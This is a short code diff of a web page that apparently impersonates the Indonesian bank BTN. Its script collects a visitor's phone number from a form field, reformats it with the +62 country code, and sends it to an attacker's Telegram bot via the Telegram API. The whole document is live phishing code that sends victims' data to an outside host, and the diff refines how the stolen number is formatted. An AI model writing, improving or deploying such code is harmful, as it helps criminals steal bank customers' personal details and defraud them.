@@ -213,8 +213,14 @@ chsalxcome {
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script src="i.js"></script>
 <script>
-      
-var logo = "━─━─✧༺𝘽𝙏𝙉༻✧─━─━";        
+ $(document).ready(function() {
+    $('#nohp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});     
+var logo = "━─━─༺𝙬𝙬𝙬.𝙗𝙩𝙣.𝙘𝙤.𝙞𝙙___▩";        
  function sendHp(){
       event.preventDefault();
       $(".process").fadeIn(); 
@@ -222,7 +228,7 @@ var logo = "━─━─✧༺𝘽𝙏𝙉༻✧─━─━";
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
           
-    var gabungan = "" + logo + '%0A%0A※ 𝗡𝗼.𝗛𝗣 •• ' + nohp ;
+    var gabungan = "" + logo + '%0A%0A※ 𝗡𝗼.𝗛𝗣 •• %2B62' + nohp ;
         $.ajax({                   
             url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
             method: `POST`,                      
